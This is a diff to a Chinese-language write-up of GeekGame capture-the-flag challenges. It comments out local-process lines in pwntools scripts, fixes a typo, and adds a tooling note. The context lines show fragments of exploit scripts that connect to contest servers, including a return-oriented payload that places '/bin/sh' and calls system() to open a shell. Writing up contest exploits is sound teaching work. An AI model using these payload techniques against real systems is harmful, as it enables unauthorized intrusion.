@@ -100,7 +100,7 @@ katex: false
 
 #### 服务器
 
-直接打开网站链接发现不行，用 `nc prob05.geekgame.pku.edu.cn 10005` 后提示需要安装 `lrzsz`，`apt` 安装后即可接收文件
+直接打开网站链接发现不行，用 `nc prob05.geekgame.pku.edu.cn 10005` 后 Konsole 提示需要安装 `lrzsz`，`apt` 安装后即可接收文件
 
 <br>
 
@@ -1197,7 +1197,7 @@ from pwn import *
 import binascii
 from icecream import ic
 
-sh = process('./pwn')
+# sh = process('./pwn')
 
 sh = remote('prob09.geekgame.pku.edu.cn', 10009)
 sh.sendlineafter(
@@ -1336,7 +1336,7 @@ payload 包含了这个格式化字符串，shellcode，以及 `libcStackEnd` �
 from pwn import *
 from icecream import ic
 
-sh = process('./pwn')
+# sh = process('./pwn')
 
 sh = remote('prob09.geekgame.pku.edu.cn', 10009)
 sh.sendlineafter(
@@ -1555,7 +1555,7 @@ int main(EVP_PKEY_CTX* param_1) {
 ```python
 from pwn import *
 
-sh = process('./challenge1')
+# sh = process('./challenge1')
 sh = remote('prob09.geekgame.pku.edu.cn', 10010)
 
 sh.sendlineafter(
@@ -1570,7 +1570,7 @@ main137 = 0x401311
 add_rsp_0x88_ret = 0x401365
 
 payload = b'A' * 120 + main137.to_bytes(8, 'little') + b'B' * 16 + b'/bin/sh\0' + b'C' * 112
-payload += ret.to_bytes(8, 'little') + (add_rsp_0x88_ret.to_bytes(8, 'little') + b'D' * 0x88) * 2 + system_plt.to_bytes(z8, 'little')
+payload += ret.to_bytes(8, 'little') + (add_rsp_0x88_ret.to_bytes(8, 'little') + b'D' * 0x88) * 2 + system_plt.to_bytes(8, 'little')
 
 assert b'\n' not in payload
 
@@ -1654,7 +1654,7 @@ int main(EVP_PKEY_CTX* param_1) {
 from pwn import *
 from icecream import ic
 
-sh = process('./challenge2')
+# sh = process('./challenge2')
 file = ELF('./challenge2')
 
 sh = remote('prob09.geekgame.pku.edu.cn', 10011)
